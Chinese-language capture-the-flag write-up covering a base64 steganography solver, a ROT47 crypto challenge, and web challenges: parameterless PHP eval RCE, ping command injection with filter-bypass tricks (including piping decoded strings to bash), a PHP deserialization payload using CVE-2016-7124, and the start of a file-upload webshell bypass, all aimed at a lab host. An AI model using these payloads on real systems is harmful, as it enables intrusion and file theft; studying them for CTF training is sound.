+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">def get_base64_diff_value(s1, s2):</span><br><span class="line">    base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><span class="line">    res = 0</span><br><span class="line">    for i in xrange(len(s2)):</span><br><span class="line">        if s1[i] != s2[i]:</span><br><span class="line">            return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">def solve_stego():</span><br><span class="line">    with open(&#x27;D:/bjutCTF/MISC/flag.txt&#x27;, &#x27;rb&#x27;) as f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = &#x27;&#x27;</span><br><span class="line">        for line in file_lines:</span><br><span class="line">            steg_line = line.replace(&#x27;\n&#x27;, &#x27;&#x27;)</span><br><span class="line">            norm_line = line.replace(&#x27;\n&#x27;, &#x27;&#x27;).decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).replace(&#x27;\n&#x27;, &#x27;&#x27;)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            print diff</span><br><span class="line">            pads_num = steg_line.count(&#x27;=&#x27;)</span><br><span class="line">            if diff:</span><br><span class="line">                bin_str += bin(diff)[2:].zfill(pads_num * 2)</span><br><span class="line">            else:</span><br><span class="line">                bin_str += &#x27;0&#x27; * pads_num * 2</span><br><span class="line">            print goflag(bin_str)</span><br><span class="line"></span><br><span class="line">def goflag(bin_str):</span><br><span class="line">    res_str = &#x27;&#x27;</span><br><span class="line">    for i in xrange(0, len(bin_str), 8):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + 8], 2))</span><br><span class="line">    return res_str</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109104301863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="得到flag"></p>
+<h3 id="知识扩充：-2"><a href="#知识扩充：-2" class="headerlink" title="知识扩充："></a>知识扩充：</h3><p><a target="_blank" rel="noopener" href="https://xingshuaikun.gitee.io/2020/01/09/base64%E9%9A%90%E5%86%99%EF%BC%88%E8%BD%AC%EF%BC%89/">base64隐写</a></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><h3 id="题目描述：-4"><a href="#题目描述：-4" class="headerlink" title="题目描述："></a>题目描述：</h3><h3 id="解题思路：-4"><a href="#解题思路：-4" class="headerlink" title="解题思路："></a>解题思路：</h3><p>题目解压缩后是一个txt文件，里面内容是<br>dikqTCpfRjA8fUBIMD5GNDkwMjNARkUwI0BFTg&#x3D;&#x3D;<br>该字符串转base64得到</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225172113783.png" alt="base64解密"></p>
+<p>再转ROT47即可得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225172209882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="rot47解密"></p>
+<h3 id="知识扩充：-3"><a href="#知识扩充：-3" class="headerlink" title="知识扩充："></a>知识扩充：</h3><ul>
+<li>rot47加解密</li>
+</ul>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="禁止套娃！"><a href="#禁止套娃！" class="headerlink" title="禁止套娃！"></a>禁止套娃！</h2><h3 id="题目描述：-5"><a href="#题目描述：-5" class="headerlink" title="题目描述："></a>题目描述：</h3><h3 id="解题思路：-5"><a href="#解题思路：-5" class="headerlink" title="解题思路："></a>解题思路：</h3><p>打开题目发现如下界面</p>
+<p><img src="https://img-blog.csdnimg.cn/20191226083642799.png" alt="禁止套娃"></p>
+<p>这道题改编自2019ByteCTF，所谓无参数RCE，就是只允许执行a(), a(())这样的函数，而不允许带参数，比如echo(“aa”)是禁止的 关于无参数RCE，推荐一篇一叶飘零和pdsdt两个大佬的文章：</p>
+<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a><br><a target="_blank" rel="noopener" href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/">http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code&#x2F;</a></p>
+<p>首先可以扫描目录，发现.git&#x2F;文件夹，直接 githack 走一波搞源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://172.21.4.12:10031/.git/</span><br></pre></td></tr></table></figure>
+
+<p>得到如下的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    if(!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;]))</span><br><span class="line">    &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z|\-]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;]))</span><br><span class="line">        &#123;</span><br><span class="line">            if(!preg_match(&#x27;/et|na|nt|info|dec|bin|hex|oct|pi|log/i&#x27;, $code))</span><br><span class="line">            &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; // highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看下正则匹配，<font color=red>(?R)</font>引用当前表达式，后面加了<font color=red>?</font>递归调用。只能匹配通过无参数的函数,然后<font color=red>eval($_GET[‘exp’]);</font>，典型的无参数RCE </p>
+<p>由于正则匹配了一些关键字比如<font color=red>et</font>导致很多函数不能用，getshell什么的基本不可能，只能考虑读源码。</p>
+<p>如何得到文件名flag.php 要想读出flag.php，就需要有一个函数返回flag.php文件名，<font color=red>scandir()函数可以扫描当前目录下的文件</font>，例如： &lt;?php print_r(scandir(‘.’));</p>
+<p>1 chr(46)</p>
+<p>如何得到scandir()中的’.’ 1.chr(46) 对于这种方法<font color=red>chr(46)</font>，又来了新的问题，46如何得到？下面列出三种方法：</p>
+<ul>
+<li>chr(rand())</li>
+<li>chr(time())</li>
+<li>chr(current(localtime(time())))</li>
+</ul>
+<p>推荐大家用第三种，前两种要看人品，有时候好几分钟才能碰巧成功。<br><font color=red>localtime(time())</font>的返回是一个数组，Array[0]为一个0~60之间的数字，每秒加1，所以最多一分钟就可以得到46。由于php数组内部指针默认指向第一个元素，所以<font color=red>current()</font>或<font color=red>pos()</font>取数组中当前元素的值，就得到了这个数字。</p>
+<p>相关操作数组的方法有：</p>
+<ul>
+<li>end()    将内部指针指向数组中的最后一个元素，并输出</li>
+<li>next()    将内部指针指向数组中的下一个元素，并输出</li>
+<li>prev()    将内部指针指向数组中的上一个元素，并输出</li>
+<li>reset()    将内部指针指向数组中的第一个元素，并输出</li>
+<li>each()    返回当前元素的键名和键值，并将内部指针向前移动</li>
+</ul>
+<p>2 current(localeconv())</p>
+<p><font color=red>localeconv()</font> 函数返回一包含本地数字及货币格式信息的数组，<br><font color=red>current(localeconv())</font>永远都是个点</p>
+<p>如何得到flag.php<br>现在，我们尝试用<font color=red>scandir()</font>扫描当前目录</p>
+<blockquote>
+<p>?exp&#x3D;print_r(scandir(current(localeconv())));</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20191226100023974.png" alt="flag.php"></p>
+<p>可见，flag.php是倒数第二个值，假设是倒数第一个我们可以用<font color=red>end()</font>，但是并没有一个操作数组的函数能够输出数组的倒数第二个值。怎么办？依然有两种方法（我只想到这两种）</p>
+<p>3 array_reverse()</p>
+<p>看函数名就知道了，以相反的元素顺序返回数组</p>
+<blockquote>
+<p>?exp&#x3D;print_r(array_reverse(scandir(current(localeconv()))));</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20191226100606662.png" alt="以相反顺序返回数组"></p>
+<p>然后上面介绍操作数组的方法中，next()将内部指针指向数组中的下一个元素并输出，<font color=red>next(array_reverse(scandir(pos(localeconv()))))</font>就得到了<font color=red>flag.php</font></p>
+<p><img src="https://img-blog.csdnimg.cn/20191226100900545.png" alt="next()得到flag.php"></p>
+<p>4 array_rand(array_flip())</p>
+<p><font color=red>array_flip()</font>交换数组的键和值</p>
+<blockquote>
+<p>?exp&#x3D;print_r(array_flip(scandir(current(localeconv()))));</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20191226101045685.png" alt="交换数组键值"></p>
+<p><font color=red>array_rand()</font>从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中<font color=red>scandir()</font>返回的数组只有5个元素，刷新几次就能刷出来flag.php</p>
+<blockquote>
+<p>?exp&#x3D;print_r(array_rand(array_flip(scandir(current(localeconv())))));</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20191226101310311.png" alt="不断刷新"></p>
+<p>如何读flag.php的源码</p>
+<p>因为<font color=red>et</font>被ban了，所以不能使用<font color=red>file_get_contents()</font>，但是可以可以使用<font color=red>readfile()</font>或<font color=red>highlight_file()</font></p>
+<blockquote>
+<p>view-source:<a target="_blank" rel="noopener" href="http://172.21.4.12:10031/?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()">http://172.21.4.12:10031/?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()</a>))))));</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20191226130231606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="得到flag"></p>
+<p>官方给的exp是</p>
+<blockquote>
+<p>?exp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</p>
+</blockquote>
+<h2 id="ping-ping-ping"><a href="#ping-ping-ping" class="headerlink" title="ping ping ping"></a>ping ping ping</h2><h3 id="题目描述：-6"><a href="#题目描述：-6" class="headerlink" title="题目描述："></a>题目描述：</h3><h3 id="解题思路：-6"><a href="#解题思路：-6" class="headerlink" title="解题思路："></a>解题思路：</h3><p>两条linux shell命令一起执行，中间的分隔符一般有以下几种</p>
+<ul>
+<li>;</li>
+<li>&amp;&amp;</li>
+<li>||</li>
+<li>%0a</li>
+<li>%0d</li>
+<li>| (管道符)</li>
+</ul>
+<p>打开题目测试发现，ping x.x.x.x -c 4</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225190719315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="127.0.0.1"></p>
+<p>fuzz后发现，只有分号<font color=red>;</font>没有被ban，导致可以两条命令同时执行</p>
+<blockquote>
+<p>127.0.0.1;env</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20191225190832322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="127.0.0.1;env"></p>
+<p>绕过空格过滤 继续fuzz，发现空格被ban了</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225190918321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="空格被过滤"></p>
+<p>对于空格，可以使用但不限于以下几种替代方案：</p>
+<ul>
+<li>$IFS</li>
+<li>${IFS}</li>
+<li>$IFS$9</li>
+<li>&lt;</li>
+<li>&lt;&gt;</li>
+<li>{cat,flag.php}  &#x2F;&#x2F;用逗号实现了空格功能，需要用<font color=red>{}</font>括起来</li>
+<li>%20</li>
+<li>%09</li>
+</ul>
+<p>发现<font color=red>{ } &lt; &gt; %09</font>都被过滤了，但是可以使用<font color=red>$IFS</font>和<font color=red>$IFS$9</font>来绕过空格过滤<br>绕过关键字黑名单，bypass空格过滤，查看index.php的源代码</p>
+<blockquote>
+<p>?ip&#x3D;127.0.0.1;cat$IFS$9index.php</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;ip&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))</span><br><span class="line">    &#123;</span><br><span class="line">        echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="line">        die(&quot;fxck your symbol!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else if(preg_match(&quot;/ /&quot;, $ip))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;fxck your space!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else if(preg_match(&quot;/bash/&quot;, $ip))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;fxck your bash!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;fxck your flag!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    print_r($a);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可见flag被过滤了，同样的方法<font color=red>cat$IFS$9flag.php</font>就会<font color=red>die(“fxck your flag”);</font></p>
+<p>绕过关键字，可以使用但不限于以下几种方法：</p>
+<ul>
+<li>ca\t y1n\g.php        反斜线绕过</li>
+<li>cat y1”ng.php        两个单引号绕过 </li>
+<li>echo “Y2F0IHkxbmcucGhw” | base64 -d | bash       base64编码绕过</li>
+<li>echo “6361742079316E672E706870” | xxd -r -p | bash       hex编码绕过</li>
+<li>cat y1[n]g.php       用<font color=red>[]</font>匹配</li>
+<li>cat y1n*       用<font color=red>*</font>匹配任意</li>
+<li>内联执行</li>
+</ul>
+<p>根据index.php的源码中的正则匹配，本题目可以使用变量拼接绕过得到flag</p>
+<blockquote>
+<p>?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$9fla$a.php</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20191225191949696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="变量拼接绕过"></p>
+<p>当然也可以像V&amp;N的师傅们一样使用内联执行，一种非常巧妙的姿势</p>
+<p><font color=red>所谓内联执行，就是将反引号 <code>ls</code> 内命令的输出(ls的结果)作为另一个命令的输入</font></p>
+<p>exp如下：</p>
+<blockquote>
+<p>?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$9<code>ls</code> 将<code>ls</code></p>
+</blockquote>
+<p>的执行结果（index.php和flag.php）作为cat的输入，直接得到index.php和flag.php的源码</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225192419556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="内联执行绕过"></p>
+<p>bypass技巧参考文章</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.it1352.com/757355.html">http://www.it1352.com/757355.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Virtual_Func/article/details/51182347">https://blog.csdn.net/Virtual_Func&#x2F;article&#x2F;details&#x2F;51182347</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/whusl/article/details/84126534">https://blog.csdn.net/whusl/article/details/84126534</a></li>
+</ul>
+<h2 id="Do-you-know-robots"><a href="#Do-you-know-robots" class="headerlink" title="Do you know robots"></a>Do you know robots</h2><h3 id="题目描述：-7"><a href="#题目描述：-7" class="headerlink" title="题目描述："></a>题目描述：</h3><h3 id="解题思路：-7"><a href="#解题思路：-7" class="headerlink" title="解题思路："></a>解题思路：</h3><p>打开是一个无情的报菜名机器，题目提示 robots 协议，可以看到一个vim备份文件<font color=red>index.php~</font> ，下载源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileReader</span><br><span class="line">&#123;</span><br><span class="line">    public $Filename;</span><br><span class="line">    public $start;</span><br><span class="line">    public $max_length;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;Filename = __DIR__ . &quot;/bcm.txt&quot;;</span><br><span class="line">        $this-&gt;start = 12;</span><br><span class="line">        $this-&gt;max_length = 72;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;Filename = __DIR__ . &quot;/fake_f1ag.php&quot;;</span><br><span class="line">        $this-&gt;start = 10;</span><br><span class="line">        $this-&gt;max_length = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $data = file_get_contents($this-&gt;Filename, 0, NULL, $this-&gt;start, $this- &gt;max_length);</span><br><span class="line">        if(preg_match(&quot;/\&#123;|\&#125;/&quot;, $data))</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;you can&#x27;t read flag!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo $data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;exp&#x27;]))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;hack!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $exp = $_REQUEST[&#x27;exp&#x27;];</span><br><span class="line">    $e = unserialize($exp);</span><br><span class="line">    echo $e-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $exp = new FileReader();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化利用位点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;exp&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;exp&#x27;]))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;hack!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $exp = $_REQUEST[&#x27;exp&#x27;];</span><br><span class="line">    $e = unserialize($exp);</span><br><span class="line">    echo $e-&gt;Filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要通过GET方式传入一个不含flag的exp，然后通过将<font color=red>$_REQUEST[‘exp’]</font>反序列化。</p>
+<p>审源码可以得知这是个标准的反序列化题目，变量名都是public类型（<font color=red>注意如果是private类型需<br>要增加\0</font>），主要功能是将文件上传和报菜名2333</p>
+<p>网页使用<font color=red>$_GET</font>方法传参，但是会正则匹配<font color=red>.?f.?l.?a.?g.?</font> ，导致不可以读flag，但是仔细审计就会发现问题，真正的<font color=red>$exp</font>是接受的<font color=red>$_REQUEST[‘exp’]</font>的，针对这种使用<font color=red>$_REQUEST[]</font>接收参数的代码，如果同时使用<font color=red>get</font>和<font color=red>post</font>两种方式传相同类型的参数，那么<font color=red>post</font>的参数会覆盖掉<font color=red>get</font>的参数，最终<font color=red>$_REQUEST[]</font>接受的参数是<font color=red>post</font>过来的</p>
+<p>上面可能有些拗口，实际举个例子就是<font color=red>post</font>url传<font color=red>?a&#x3D;1</font>，同时用<font color=red>post</font>发送<font color=red>a&#x3D;2</font>，在服务器使用<font color=red>$_REQUEST[‘a’]</font>接受参数，最后<font color=red>$_REQUEST[‘a’]</font>的值是2，大家可以自己动手做做实验。<br>此外，<font color=red>__wakeup()</font>会在反序列化的时候自动调用，会复写掉文件，这时候就要请出 <font color=red>CVE-2016- 7124</font>，只要让成员属性数目大于实际数目时就可以绕过wakeup()方法因此我们可以构造payload</p>
+<blockquote>
+<p>O:10:”FileReader”:4:{s:8:”Filename”;s:57:”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”;s:5:”start”;i:0;s:10:”max_length”;i:10000;} </p>
+</blockquote>
+<p>将这个序列化字符串通过post形式传给exp，GET方式就随便给个1，将得到的base64解密即可得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20191226134751833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="使用伪协议"></p>
+<p><img src="https://img-blog.csdnimg.cn/20191226134450651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="利用伪协议得到flag"></p>
+<p>不用伪协议，也完全OK</p>
+<p>通过修改<font color=red>start</font>和<font color=red>max_length</font>，读取<font color=red>{}</font>里面的部分，然后再放到<font color=red>GXY{}</font>里面，这应该是出题人的本意。</p>
+<blockquote>
+<p>exp： exp&#x3D;O:10:”FileReader”:4:{s:8:”Filename”;s:22:”&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;s:5:”start”;i:21;s:10:”max_length”;i:17;}</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20191226134820556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="不使用伪协议"></p>
+<p><img src="https://img-blog.csdnimg.cn/20191226134708758.png" alt="不用伪协议得到flag"></p>
+<h2 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h2><h3 id="题目描述：-8"><a href="#题目描述：-8" class="headerlink" title="题目描述："></a>题目描述：</h3><h3 id="解题思路：-8"><a href="#解题思路：-8" class="headerlink" title="解题思路："></a>解题思路：</h3><p>就是每3s就会删除你上传的东西</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109115416760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="每三秒删除上传的内容"></p>
+<p>打开题目，先fuzz，传jpg格式的一句话</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109132239697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="上传1.jpg"></p>
+<p>盲猜可能是检测了文件开头的<font color=red>&lt;?</font>形式，更换成下图的script绕过形式，</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109114038325.png" alt="使用script绕过"></p>
+<p>发现上传成功</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109133237750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="script绕过"></p>
+<p>接下来就是绕过后缀名，题目肯定不能直接传php，尝试用<font color=red>phtml</font>之类的后缀过滤，但发现带<font color=red>ph</font>的都被ban了。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109133439663.png" alt="尝试1.phtml"></p>
+<p>这样情况下，就没有任何其他后缀名能够被php解析了。 但是继续测试发现，上传不会修改文件名，并且只要不带ph的任何其他后缀都可以上传成功，比如传个1.aaaaa</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109115727183.png" alt="上传1.aaa"></p>
+<p>这就很明显了，既然是个上传题目，方法就那么几种，这个题目也没什么别的东西了所以新姿势大概率也不可能。所以，<font color=red>想办法让服务器用php来解析其他后缀名</font>。<br>通过404页面得知网站是Apache</p>
